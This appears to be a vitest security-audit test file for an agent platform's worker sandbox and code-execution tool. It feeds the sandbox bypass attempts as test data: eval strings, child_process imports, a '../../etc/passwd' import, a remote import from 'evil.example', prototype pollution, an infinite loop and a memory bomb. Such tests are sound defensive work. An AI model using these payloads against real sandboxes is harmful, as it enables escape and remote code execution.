import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { codeExecTool, __testing__ as codeExecTesting } from './code-exec-tool.js';
import { WorkerSandbox, type WorkerToolSpec } from './worker-sandbox.js';
import { ownerPolicy } from '../security/capability-guard.js';

/**
 * Security audit for the WorkerSandbox + code.exec stack.
 *
 * Threat model:
 *   1. Static-check bypass — attacker tries to smuggle forbidden constructs.
 *   2. Worker isolation — skill code in the worker tries to mutate parent
 *      globals or read parent state through structured-clone IPC.
 *   3. Resource exhaustion — infinite loops, memory blowup. Verify the
 *      timeout / OOM path kills the worker without dragging the parent down.
 *   4. Prototype pollution — skill code pollutes Object.prototype; verify
 *      the parent's Object.prototype is unaffected.
 *   5. Filesystem / network access — by default should require capability,
 *      but our sandbox-level test just verifies the worker boundary doesn't
 *      *expand* what the parent already authorized.
 */

const { staticCheckSource } = codeExecTesting;
const POLICY = ownerPolicy('security-audit');

let tmpRoot: string;

function writeModule(name: string, source: string): string {
  const p = join(tmpRoot, `${name}.mjs`);
  writeFileSync(p, source, 'utf-8');
  return pathToFileURL(p).href;
}

beforeAll(() => {
  tmpRoot = mkdtempSync(join(tmpdir(), 'worker-security-test-'));
});
afterAll(() => {
  rmSync(tmpRoot, { recursive: true, force: true });
});

const noopCtx = {
  sessionId: 'sec',
  agentId: 'sec',
  traceId: 'sec',
  signal: new AbortController().signal,
};

// ─── 1. Static-check bypass attempts ──────────────────────────────────────

describe('static check — bypass attempts', () => {
  it.each([
    ['eval with extra spaces', 'eval ( "1+1" )', /eval/i],
    ['eval via globalThis', 'globalThis.eval("1+1")', /eval/i], // matches `eval(`
    ['Function constructor', 'new Function("return 1")', /Function/i],
    [
      'child_process via destructure',
      "import { spawn } from 'node:child_process'",
      /child_process/i,
    ],
    ['process.binding access', 'process.binding("natives")', /process\.binding/i],
    ['CommonJS require', "const fs = require('node:fs')", /require/i],
    ['dynamic import', "await import('node:fs')", /dynamic/i],
    ['npm package import', "import _ from 'lodash'", /not in the allow-list/i],
    [
      'relative file traversal import',
      "import x from '../../etc/passwd'",
      /not in the allow-list/i,
    ],
    [
      'http URL import',
      "import x from 'https://evil.example/payload.js'",
      /not in the allow-list/i,
    ],
  ])('rejects %s', (_name, source, pattern) => {
    const result = staticCheckSource(source);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toMatch(pattern);
  });

  it('accepts a clean module that uses only node:* and @agent-platform/*', () => {
    const src = `
      import { readFileSync } from 'node:fs';
      import {} from '@agent-platform/core';
      export function createTools() { return []; }
    `;
    expect(staticCheckSource(src).ok).toBe(true);
  });

  it('static check is a belt-and-suspenders filter, not a sandbox — clean source must still execute under capability gating', () => {
    // This documents the design contract. The check is *necessary but not
    // sufficient*; tools that pass the check still go through capability +
    // worker isolation.
    const src =
      "export function createTools() { return [{name:'main',async execute(){return 1}}] }";
    expect(staticCheckSource(src).ok).toBe(true);
  });
});

// ─── 2. Worker isolation — parent state ───────────────────────────────────

describe('worker isolation — parent process state', () => {
  it('skill code cannot mutate the parent process Object.prototype', async () => {
    const moduleUrl = writeModule(
      'proto-pollute',
      `
      export function createTools() {
        return [{
          name: 'main',
          async execute() {
            // Try to pollute. Worker has its own V8 isolate so the parent
            // Object.prototype is a different object — this only mutates
            // the worker's own.
            // eslint-disable-next-line no-extend-native
            (Object.prototype).__pwned = 'yes';
            return { polluted: ({}).__pwned };
          },
        }];
      }
      `,
    );
    const sandbox = new WorkerSandbox(new Map([['main', { moduleUrl, toolName: 'main' }]]));
    const inst = await sandbox.acquire(POLICY);
    const result = await sandbox.execute(inst, 'main', {}, 5000);
    await sandbox.release(inst);

    expect(result.success).toBe(true);
    // Worker saw its own pollution.
    expect(JSON.parse(result.output ?? 'null')).toEqual({ polluted: 'yes' });
    // Parent's Object.prototype is untouched.
    expect((Object.prototype as Record<string, unknown>).__pwned).toBeUndefined();
  }, 15_000);

  it('skill code cannot read parent process.env (worker is spawned with env: {})', async () => {
    // Set a unique env var on the parent.
    process.env['AGENT_TEST_SECRET'] = 'parent-secret-' + Math.random();
    try {
      const moduleUrl = writeModule(
        'env-read',
        `
        export function createTools() {
          return [{
            name: 'main',
            async execute() {
              return { secret: process.env.AGENT_TEST_SECRET ?? 'absent' };
            },
          }];
        }
        `,
      );
      const sandbox = new WorkerSandbox(new Map([['main', { moduleUrl, toolName: 'main' }]]));
      const inst = await sandbox.acquire(POLICY);
      const result = await sandbox.execute(inst, 'main', {}, 5000);
      await sandbox.release(inst);

      expect(result.success).toBe(true);
      const out = JSON.parse(result.output ?? 'null');
      // Default config strips env — worker sees 'absent', not the parent's secret.
      expect(out.secret).toBe('absent');
    } finally {
      delete process.env['AGENT_TEST_SECRET'];
    }
  }, 15_000);

  it('opt-in shareEnv: true forwards parent env (escape hatch for trusted skills)', async () => {
    process.env['AGENT_TEST_SHARED'] = 'shared-by-design';
    try {
      const moduleUrl = writeModule(
        'env-share',
        `
        export function createTools() {
          return [{
            name: 'main',
            async execute() {
              return { value: process.env.AGENT_TEST_SHARED ?? 'absent' };
            },
          }];
        }
        `,
      );
      const sandbox = new WorkerSandbox(new Map([['main', { moduleUrl, toolName: 'main' }]]), {
        shareEnv: true,
      });
      const inst = await sandbox.acquire(POLICY);
      const result = await sandbox.execute(inst, 'main', {}, 5000);
      await sandbox.release(inst);

      const out = JSON.parse(result.output ?? 'null');
      expect(out.value).toBe('shared-by-design');
    } finally {
      delete process.env['AGENT_TEST_SHARED'];
    }
  }, 15_000);

  it('IPC reply that mutates structuredClone-able args does NOT mutate the parent value', async () => {
    const moduleUrl = writeModule(
      'mutate-args',
      `
      export function createTools() {
        return [{
          name: 'main',
          async execute(args) {
            // Worker can mutate its local args copy — the parent's original
            // is unaffected because postMessage uses structuredClone.
            args.list.push('worker-added');
            return { received: args.list };
          },
        }];
      }
      `,
    );
    const sandbox = new WorkerSandbox(new Map([['main', { moduleUrl, toolName: 'main' }]]));
    const inst = await sandbox.acquire(POLICY);
    const parentArg = { list: ['parent-original'] };
    const result = await sandbox.execute(inst, 'main', parentArg, 5000);
    await sandbox.release(inst);

    expect(result.success).toBe(true);
    expect(JSON.parse(result.output ?? 'null').received).toEqual([
      'parent-original',
      'worker-added',
    ]);
    // Parent's list is unchanged.
    expect(parentArg.list).toEqual(['parent-original']);
  }, 15_000);
});

// ─── 3. Resource exhaustion ───────────────────────────────────────────────

describe('resource exhaustion', () => {
  it('infinite while-loop is killed by timeout (parent never blocks)', async () => {
    const moduleUrl = writeModule(
      'busy-loop',
      `
      export function createTools() {
        return [{
          name: 'main',
          async execute() {
            // Tight CPU loop. terminate() is the only way out.
            const start = Date.now();
            while (Date.now() - start < 60_000) {
              // burn cycles
            }
            return 'done';
          },
        }];
      }
      `,
    );
    const sandbox = new WorkerSandbox(new Map([['main', { moduleUrl, toolName: 'main' }]]));
    const inst = await sandbox.acquire(POLICY);
    const start = Date.now();
    const result = await sandbox.execute(inst, 'main', {}, 300);
    const elapsed = Date.now() - start;
    await sandbox.release(inst);

    expect(result.success).toBe(false);
    expect(result.error).toMatch(/timed out|exited/i);
    expect(elapsed).toBeLessThan(2000);
  }, 15_000);

  it('memory bomb is killed by resourceLimits — parent stays healthy', async () => {
    const moduleUrl = writeModule(
      'mem-bomb',
      `
      export function createTools() {
        return [{
          name: 'main',
          async execute() {
            // Allocate aggressively until the worker's old-generation cap blows.
            const keepalive = [];
            try {
              while (true) {
                keepalive.push(new Uint8Array(8 * 1024 * 1024)); // 8MB chunks
              }
            } catch (err) {
              // Some Node versions throw here (RangeError) before the OOM
              // killer fires. Either way the parent must still be alive.
              return { caughtInWorker: err.message };
            }
            return 'never';
          },
        }];
      }
      `,
    );
    // Aggressively low limit so the test is fast and reliable.
    const sandbox = new WorkerSandbox(new Map([['main', { moduleUrl, toolName: 'main' }]]), {
      resourceLimits: { maxOldGenerationSizeMb: 24, maxYoungGenerationSizeMb: 4 },
    });
    const inst = await sandbox.acquire(POLICY);
    const result = await sandbox.execute(inst, 'main', {}, 10_000);
    await sandbox.release(inst);

    // Either the worker caught it internally (RangeError), or the V8 OOM killer
    // fired and parent observed an exit-with-error. Both are acceptable —
    // the key invariant is that we got a result back without crashing.
    expect(result).toBeDefined();
    expect(result.toolName).toBe('main');
    if (result.success) {
      const out = JSON.parse(result.output ?? 'null');
      expect(out.caughtInWorker).toMatch(/heap|memory|allocation/i);
    } else {
      expect(result.error).toMatch(/exited|memory|allocation|timed out/i);
    }
  }, 20_000);
});

// ─── 4. code.exec: end-to-end attack scenarios ────────────────────────────

describe('code.exec — combined static + sandbox path', () => {
  it('an attacker source that bypasses static check still cannot escape the worker', async () => {
    // This source passes the static check (no eval/require/etc) but tries
    // to do something nefarious — accessing globalThis to see if worker
    // globals leak. They don't: the worker has its own V8 isolate.
    const source = `
      export function createTools() {
        return [{
          name: 'main',
          async execute() {
            const keys = Object.keys(globalThis).filter((k) => k.startsWith('parent_'));
            return { parentLeaks: keys };
          },
        }];
      }
    `;
    // Plant a fake "leak" on the parent's globalThis to prove the worker
    // can't see it.
    (globalThis as Record<string, unknown>)['parent_secret_marker'] = 'leak-target';
    try {
      const tool = codeExecTool();
      const result = await tool.execute({ sourceCode: source }, noopCtx);
      expect(result.success).toBe(true);
      expect(JSON.parse(result.output ?? 'null')).toEqual({ parentLeaks: [] });
    } finally {
      delete (globalThis as Record<string, unknown>)['parent_secret_marker'];
    }
  }, 15_000);

  it('snippet that throws non-Error values still surfaces an error result', async () => {
    const tool = codeExecTool();
    const result = await tool.execute(
      {
        sourceCode: `
        export function createTools() {
          return [{
            name: 'main',
            async execute() { throw 'plain-string-not-error'; },
          }];
        }
        `,
      },
      noopCtx,
    );
    expect(result.success).toBe(false);
    // Parent receives error.message; for a thrown string Node wraps it.
    expect(result.error).toBeTruthy();
  }, 15_000);
});

// ─── 5. Concurrency / state isolation ─────────────────────────────────────

describe('concurrency', () => {
  it('two simultaneous code.exec calls do not collide on the snippet tool name', async () => {
    const tool = codeExecTool();
    const sourceA = `
      export function createTools() {
        return [{ name: 'main', async execute(args) { return { who: 'A', got: args }; } }];
      }
    `;
    const sourceB = `
      export function createTools() {
        return [{ name: 'main', async execute(args) { return { who: 'B', got: args }; } }];
      }
    `;

    const [a, b] = await Promise.all([
      tool.execute({ sourceCode: sourceA, input: 1 }, noopCtx),
      tool.execute({ sourceCode: sourceB, input: 2 }, noopCtx),
    ]);
    expect(a.success).toBe(true);
    expect(b.success).toBe(true);
    const aOut = JSON.parse(a.output ?? 'null');
    const bOut = JSON.parse(b.output ?? 'null');
    expect(aOut).toEqual({ who: 'A', got: 1 });
    expect(bOut).toEqual({ who: 'B', got: 2 });
  }, 20_000);
});

// Suppress the unused-spec warning when this file is collected without all
// hooks firing — exporting nothing is fine for a vitest test file.
export {};
const _ignore: WorkerToolSpec | undefined = undefined;
void _ignore;
